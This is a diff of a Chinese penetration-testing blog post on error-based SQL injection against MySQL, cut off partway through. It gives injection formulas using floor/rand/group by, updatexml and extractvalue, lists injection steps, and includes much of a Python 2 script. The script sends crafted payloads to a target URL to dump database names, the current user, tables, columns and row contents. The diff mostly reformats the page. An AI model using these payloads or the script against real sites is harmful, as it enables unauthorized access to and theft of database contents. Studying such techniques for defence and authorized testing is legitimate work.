@@ -1,99 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>SQL 注入之报错型注入(MySQL) | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>SQL 注入之报错型注入(MySQL)</h1>
-      
-<div class="post-meta">
-    <time>2016-06-22</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
-</div>
-
-      <div><h3 id="0x00-前提">0x00 前提</h3>
-<pre tabindex="0"><code>一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>SQL 注入之报错型注入(MySQL) | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>SQL 注入之报错型注入(MySQL)</h1><div class=post-meta><time>2016-06-22</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/SQL%E6%B3%A8%E5%85%A5>SQL注入</a>)</div><div><h3 id=0x00-前提>0x00 前提</h3><pre tabindex=0><code>一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
-</code></pre><h3 id="0x01-利用方式">0x01 利用方式</h3>
-<p>报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):</p>
-<p>?id=2&rsquo; and (select 1 from <f>(select <u>count(*),<b>concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x</b></u> from information_schema.tables group by x )a</f>
-)--+</p>
-<p>?id=2&rsquo; and updatexml(1,concat(0x7e,(<f>SELECT @@version</f>),0x7e),1)--+</p>
-<p>?id=1&rsquo; and extractvalue(1, concat(0x7e, (<f>select @@version</f>),0x7e))--+</p>
-<p>第一个公式具体原理可以参考：<a href="/posts/2016/mysql-injection-error-based-theory-count-rand-groupby?_blank">MySQL报错注入原理分析(count()、rand()、group by)</a></p>
-<h3 id="0x02-公式解析">0x02 公式解析</h3>
-<pre tabindex="0"><code>floor()是取整数
+</code></pre><h3 id=0x01-利用方式>0x01 利用方式</h3><p>报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):</p><p>?id=2&rsquo; and (select 1 from <f>(select <u>count(*),<b>concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x</b></u> from information_schema.tables group by x )a</f>
+)--+</p><p>?id=2&rsquo; and updatexml(1,concat(0x7e,(<f>SELECT @@version</f>),0x7e),1)--+</p><p>?id=1&rsquo; and extractvalue(1, concat(0x7e, (<f>select @@version</f>),0x7e))--+</p><p>第一个公式具体原理可以参考：<a href=/posts/2016/mysql-injection-error-based-theory-count-rand-groupby?_blank>MySQL报错注入原理分析(count()、rand()、group by)</a></p><h3 id=0x02-公式解析>0x02 公式解析</h3><pre tabindex=0><code>floor()是取整数
 rand()在0和1之间产生一个随机数
 rand(0)*2将取0到2的随机数
 floor(rand()*2)有两条记录就会报错
@@ -101,274 +21,223 @@ floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值�
 count(*)是用来统计结果的，相当于刷新一次结果
 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1
 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次
-</code></pre><h3 id="0x03-注入步骤">0x03 注入步骤</h3>
-<ol>
-<li>
-<p>猜测闭合字符
-<img src="/img/post/sqli5_get_closed_character.png" alt="得到闭合字符">
-<img src="/img/post/sqli5_check_closed_character.png" alt="确认闭合字符"></p>
-</li>
-<li>
-<p>猜测列数
-<img src="/img/post/sqli5_order_by.png" alt="得到列数"></p>
-</li>
-<li>
-<p>尝试得到显示位
-<img src="/img/post/sqli5_get_display_point.png" alt="尝试得到显示位"></p>
-</li>
-<li>
-<p>报错得到数据库个数
-<img src="/img/post/sqli5_get_db_num.png" alt="报错得到数据库个数"></p>
-</li>
-<li>
-<p>报错得到数据库名
-<img src="/img/post/sqli5_get_db_name.png" alt="报错得到数据库名"></p>
-</li>
-<li>
-<p>报错得到表名
-<img src="/img/post/sqli5_get_table_num.png" alt="报错得到表的个数">
-<img src="/img/post/sqli5_get_table_name.png" alt="报错得到表名"></p>
-</li>
-<li>
-<p>报错得到列名
-<img src="/img/post/sqli5_get_column_num.png" alt="报错得到列的个数">
-<img src="/img/post/sqli5_get_column_name1.png" alt="报错得到列名1">
-<img src="/img/post/sqli5_get_column_name2.png" alt="报错得到列名2"></p>
-</li>
-<li>
-<p>得到列值
-<img src="/img/post/sqli5_get_column_value_num.png" alt="报错得到数据条数">
-<img src="/img/post/sqli5_get_column_value.png" alt="报错得到列的值"></p>
-</li>
-</ol>
-<h3 id="0x04-附上利用代码">0x04 附上利用代码</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-  </span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> re
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib2
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> binascii
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pyfiglet <span style="color:#f92672">import</span> figlet_format
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> optparse <span style="color:#f92672">import</span> OptionParser
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># --dbs url</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getAllDatabases</span>(url):
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print url</span>
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and(select 1 from(select+count(*),concat((select (select (select+concat(0x7e7e3a7e7e, count(distinct table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span>
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/**/&#34;</span><span style="color:#f92672">.</span>join(payload<span style="color:#f92672">.</span>split())
-</span></span><span style="display:flex;"><span>    dbs_num_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> payload
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print dbs_num_url</span>
-</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(dbs_num_url)
-</span></span><span style="display:flex;"><span>    html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print html</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># ~~:~~5~~:~~</span>
-</span></span><span style="display:flex;"><span>    dbs_num <span style="color:#f92672">=</span> int(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(\d*?)~~:~~&#39;</span>, html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;database num: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> dbs_num
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;database name: &#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,dbs_num):
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39; and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style="color:#f92672">%</span> index
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/**/&#34;</span><span style="color:#f92672">.</span>join(payload<span style="color:#f92672">.</span>split())
-</span></span><span style="display:flex;"><span>        db_name_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> payload
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(db_name_url)
-</span></span><span style="display:flex;"><span>        html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>        db_name <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(.*?)~~:~~&#39;</span>, html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> db_name
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getCurrentDb</span>(url):
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print &#34;CurrentDb is: aaaa&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print url</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    current_db_name_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/database()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&#34;</span>
-</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(current_db_name_url)
-</span></span><span style="display:flex;"><span>    html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>    current_db_name <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(.*?)~~:~~&#39;</span>, html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Current database is: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> current_db_name
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getCurrentUser</span>(url):
-</span></span><span style="display:flex;"><span>    db_name_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/user()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&#34;</span>
-</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(db_name_url)
-</span></span><span style="display:flex;"><span>    html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>    user_name <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(.*?)~~:~~&#39;</span>, html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Current user is: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> user_name
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># --tables -D database url</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getAllTablesByDb</span>(url,db_name):
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print db_name</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print url</span>
-</span></span><span style="display:flex;"><span>    db_name_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>b2a_hex(db_name)
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print db_name_hex</span>
-</span></span><span style="display:flex;"><span>    tables_num_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/count(table_name),/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&#34;</span> <span style="color:#f92672">%</span> db_name_hex
-</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(tables_num_url)
-</span></span><span style="display:flex;"><span>    html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print html</span>
-</span></span><span style="display:flex;"><span>    tables_num <span style="color:#f92672">=</span> int(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(\d*?)~~:~~&#39;</span>, html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print tables_num</span>
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> table&#34;</span> <span style="color:#f92672">%</span> (db_name, tables_num)
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;table name: &#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,tables_num):
-</span></span><span style="display:flex;"><span>        tables_name_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/table_name,/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">/**/limit/**/</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&#34;</span> <span style="color:#f92672">%</span> (db_name_hex, index)
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(tables_name_url)
-</span></span><span style="display:flex;"><span>        html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print html</span>
-</span></span><span style="display:flex;"><span>        table_name <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(.*?)~~:~~&#39;</span>,html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> table_name
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getAllColumnsByTable</span>(url,table_name,db_name):
-</span></span><span style="display:flex;"><span>    db_name_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>b2a_hex(db_name)
-</span></span><span style="display:flex;"><span>    table_name_hex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> binascii<span style="color:#f92672">.</span>b2a_hex(table_name)
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> and table_schema=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style="color:#f92672">%</span> (table_name_hex,db_name_hex)
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print payload</span>
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/**/&#34;</span><span style="color:#f92672">.</span>join(payload<span style="color:#f92672">.</span>split())
-</span></span><span style="display:flex;"><span>    column_num_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> payload
-</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(column_num_url)
-</span></span><span style="display:flex;"><span>    html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>    column_num <span style="color:#f92672">=</span> int(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(\d*?)~~:~~&#39;</span>,html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print column_num</span>
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Table </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> of the </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> columns&#34;</span> <span style="color:#f92672">%</span> (table_name,db_name,column_num)
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Table </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> contains the column name:&#34;</span> <span style="color:#f92672">%</span> table_name
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,column_num):
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,column_name,0x7e7e3a7e7e) from information_schema.columns where table_name=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> and table_schema=</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> limit </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style="color:#f92672">%</span> (table_name_hex,db_name_hex,index)
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/**/&#34;</span><span style="color:#f92672">.</span>join(payload<span style="color:#f92672">.</span>split())
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print payload</span>
-</span></span><span style="display:flex;"><span>        column_value_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> payload
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(column_value_url)
-</span></span><span style="display:flex;"><span>        html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print html</span>
-</span></span><span style="display:flex;"><span>        column_name <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(.*?)~~:~~&#39;</span>,html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
-</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> column_name
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getAllcontent</span>(url,column_name,table_name,db_name):
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print url</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print column_name</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print table_name</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print db_name</span>
-</span></span><span style="display:flex;"><span>    column_name <span style="color:#f92672">=</span> column_name<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;,&#39;</span>)
-</span></span><span style="display:flex;"><span>    num_column <span style="color:#f92672">=</span> len(column_name) <span style="color:#75715e">#想得到的字段的个数</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print column_name</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print num_column</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(*),0x7e7e3a7e7e) from </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">.</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style="color:#f92672">%</span> (db_name,table_name)
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print payload</span>
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/**/&#34;</span><span style="color:#f92672">.</span>join(payload<span style="color:#f92672">.</span>split())
-</span></span><span style="display:flex;"><span>    column_value_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> payload
-</span></span><span style="display:flex;"><span>    response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(column_value_url)
-</span></span><span style="display:flex;"><span>    html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print html</span>
-</span></span><span style="display:flex;"><span>    column_value_num <span style="color:#f92672">=</span> int(re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;~~:~~(\d*?)~~:~~&#39;</span>,html)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>))
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Table </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> has </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> columns&#34;</span> <span style="color:#f92672">%</span> (table_name,column_value_num)
-</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Table </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> column values:&#34;</span> <span style="color:#f92672">%</span> table_name
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    title <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>    str_value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0x7e7e3a7e7e,&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,num_column):
-</span></span><span style="display:flex;"><span>        title <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%-15s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> column_name[x]
-</span></span><span style="display:flex;"><span>        str_value <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">,0x20,&#34;</span> <span style="color:#f92672">%</span> column_name[x]
-</span></span><span style="display:flex;"><span>    str_value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;,&#34;</span><span style="color:#f92672">.</span>join(str_value<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;,&#39;</span>)[<span style="color:#ae81ff">0</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>]) <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;,0x7e7e3a7e7e&#34;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># print str_value</span>
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    print title
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">0</span>,column_value_num):
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39;+and(select 1 from(select count(*),concat((select (select ( select concat(</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">) from </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">.</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> limit </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&#34;</span> <span style="color:#f92672">%</span> (str_value,db_name,table_name,index)
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print payload</span>
-</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/**/&#34;</span><span style="color:#f92672">.</span>join(payload<span style="color:#f92672">.</span>split())
-</span></span><span style="display:flex;"><span>        value_url <span style="color:#f92672">=</span> url <span style="color:#f92672">+</span> payload
-</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> urllib2<span style="color:#f92672">.</span>urlopen(value_url)
-</span></span><span style="display:flex;"><span>        html <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print html</span>
